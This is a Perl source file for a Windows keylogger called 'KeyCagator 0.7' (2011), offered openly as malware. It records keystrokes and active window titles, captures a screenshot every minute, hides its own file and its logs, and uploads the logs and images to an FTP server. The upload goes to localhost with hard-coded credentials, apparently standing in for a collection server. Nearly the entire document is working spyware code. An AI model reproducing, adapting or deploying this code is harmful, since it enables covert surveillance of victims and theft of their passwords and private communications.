#!usr/bin/perl
#KeyCagator 0.7 (C) Doddy Hackman 2011
#

use Win32::API;
use Win32::GuiTest qw(GetForegroundWindow GetWindowText FindWindowLike SetForegroundWindow SendKeys);
use Win32::Clipboard;
use threads;
use Net::FTP;
use Win32::File;
use Cwd;

my $come = new Win32::API("user32", "GetAsyncKeyState","N", "I");
my $tengo = 0;	

#if ($^O eq 'MSWin32') {
#use Win32::Console; 
#Win32::Console::Free();
#}

hideit($0,"hide");

subirftp("logs.txt","logs.txt");

my $comando1 = threads->new(\&capture_windows);
my $comando2 = threads->new(\&capture_keys);
my $comando3 = threads->new(\&capture_screen);

$comando1->join();
$comando2->join();
$comando3->join();


sub capture_windows {

while(1) {

my $win1 = GetForegroundWindow();         
my $win2 = GetForegroundWindow(); 

if($win1 != $win2){
my $nombre = GetWindowText($win1); 
chomp($nombre);
if ($nombre ne "") {
#print "\n\n[".$nombre."]\n\n";
savefile("logs.txt","\n\n[".$nombre."]\n\n");
}
}
}
return 1;
}
	
sub capture_keys {

while(1) {

my $test1;
my $test2;

for my $num(0x30..0x39) { #Numbers	

if (dame($num)) {
#print "number : ".chr($num)."\n";
savefile("logs.txt",chr($num));
}
}

if (dame(0x14)) {
$test1 = 1;
$tengo++;
}

for my $num(0x41..0x5A) {	#Words

if (dame($num)) {

if (dame(0x20)) {
savefile("logs.txt"," ");
}

if (dame(0x32)) {
savefile("logs.txt","\n[enter]\n\n");
}

unless (verpar($tengo) eq 1) {
#print "MAYUSCULA : ".chr($num)."\n";
savefile("logs.txt",chr($num));
}

if (dame(0x10) or dame(0xA0) or dame(0xA1)) {
#print "MAYUSCULA : ".chr($num)."\n";
$test2 = 1;
}

unless ($test1 eq 1 or $test2 eq 1) {
if ($num >= 0x41) {
if ($num <= 0x5A) {
if (verpar($tengo) eq 1) {
#print "MINUSCULA : ".chr($num+32)."\n";
savefile("logs.txt",chr($num+32));
}
}
}
} 
}
}
}
return 1;
}

sub capture_screen {

$numero = 0;

while(1) {

sleep 60;

$numero++;

SendKeys("%{PRTSCR}"); 

my $a = Win32::Clipboard::GetBitmap();

open (FOTO,">".$numero.".bmp");
binmode(FOTO);
print FOTO $a;
close FOTO;

hideit($numero.".bmp","hide");
subirftp($numero.".bmp",$numero.".bmp");
}
}

sub dame {
return($come->Call(@_) & 1);
}

sub savefile {

open (SAVE,">>".$_[0]);
print SAVE $_[1];
close SAVE; 

hideit($_[0],"hide");

}

sub hideit {
if ($_[1] eq "show") {
Win32::File::SetAttributes($_[0],NORMAL);
}
elsif ($_[1] eq "hide") {
Win32::File::SetAttributes($_[0],HIDDEN);
}
else {
print "error\n";
}
}

sub subirftp {

if ($ser = Net::FTP->new("localhost")) {
if ($ser->login("doddy","123")) {
print "subi".getcwd()."/".$_[0]."\n";
if ($ser->put(getcwd()."/".$_[0],$_[1])) {
return true;
}
}
$ser->close;
}


}

sub verpar { 
return ($_[0] % 2 == 0) ? "1" : "2";
}


#Credits : to explorer for helpme with the function verpar()
#Mail : lepuke[at]hotmail[com]
#Blog : doddy-hackman.blogspot.com
# ¿ The End ?